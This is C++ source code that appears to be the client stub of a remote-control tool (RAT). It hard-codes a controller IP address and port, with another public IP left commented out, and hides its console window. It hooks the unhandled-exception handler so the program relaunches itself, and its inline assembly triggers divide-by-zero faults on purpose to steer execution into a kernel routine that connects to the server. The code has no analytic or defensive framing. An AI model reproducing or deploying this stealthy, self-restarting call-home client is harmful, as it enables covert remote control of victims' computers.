#include <stdio.h>
#include "IOCPClient.h"
#include "ModuleEntry.h"

//#define _MY_DEBUG

//#ifdef _MY_DEBUG
//#define HOST "192.168.43.107" 
//#else
//#define HOST  "81.68.224.152"
//#define HOST "127.0.0.1"
#define HOST "192.168.0.107"
//#endif

//extern "C" __declspec(dllexport) 
char szServerAddr[64] = HOST;
//extern "C" __declspec(dllexport) 
unsigned short Port = 10086;

class CClient{
private:
	static void Restart()
	{
		PROCESS_INFORMATION pi;
		STARTUPINFOW si = { sizeof(si) };
		wchar_t szModuleName[0x1000];
		//exec another instance.
		GetModuleFileNameW(GetModuleHandleW(0), szModuleName, 0x1000);
		CreateProcess(szModuleName, 0, 0, 0, 0, 0, 0, 0, &si, &pi);
	
		ExitProcess(0);
	}

	static LONG  __stdcall Exception(struct _EXCEPTION_POINTERS *ExceptionInfo
		)
	{
		ExceptionInfo->ContextRecord->Eip = (unsigned long)Restart;
		return EXCEPTION_CONTINUE_EXECUTION;
	}
public:
	CClient(){

#ifndef _DEBUG
		ShowWindow(GetConsoleWindow(),SW_HIDE);
#endif
		SetUnhandledExceptionFilter(Exception);
		CIOCPClient::SocketInit();
		do{
			__asm{
				///////
				cmp esp, 0x100;
				jb fuck;

				push 0;

				lea eax, [Port];
				mov eax, [eax]
				push eax

				lea eax, [szServerAddr]
				push eax

				push ExitProcess;
				jmp BeginKernel;
fuck:
				nop;
				
				xor eax, eax;
				div eax;
			}
		} while (true);
		CIOCPClient::SocketTerm();
	}
};

CClient theClient;

int main(){
	do{
		CClient client2;
		__asm{
			mov eax,5;
			add esp,0x10086;
			cmp esp,0x524
			ja ok
			xor ebx,ebx;
			div ebx;
ok:
			xor eax,eax;
			div eax
		}
	}while(1);
	return 0;
}